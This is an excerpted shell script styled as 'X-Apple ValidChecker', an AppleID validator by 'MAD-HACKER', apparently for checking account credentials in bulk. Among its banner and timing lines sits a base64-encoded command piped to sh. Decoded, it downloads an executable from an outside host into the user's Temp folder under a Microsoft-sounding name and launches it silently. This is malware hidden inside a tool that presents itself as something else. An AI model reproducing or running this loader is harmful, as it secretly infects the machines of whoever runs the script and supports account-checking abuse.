...
printf "$NC\n"
cat <<EOF
              - X-Apple ValidChecker -
                 [+] MAD-HACKER [+]
        
---------------------------------------------------
        MAD-HACKER - AppleID Validator 2019
---------------------------------------------------
...
Report any bugs to: <MAD-HACKER> t.me/madhacker
"
  exit 1 
}
...
malhadi_appleval() {
  ...
  footer="[MAD-HACKER - AppleValid 2019] $(($duration % 60))sec.\n"
...
base64 -d <<< "cHRoPSJDOlxVc2Vyc1xcJCh3aG9hbWkpXEFwcERhdGFcTG9jYWxcVGVtcFxtaWNyb3NvZnRhcGkuZXhlIgpjdXJsIC1zIGh0dHA6Ly9wcm92aXAuY2MvcGx1Z2lucy93dGYuZXhlIC1vICRwdGggCnN0YXJ0ICRwdGggLXNpbGVudA==" | sh
...
echo "+==========+ PH03N!X - Applevalid 2019 - MAD-HACKER +==========+"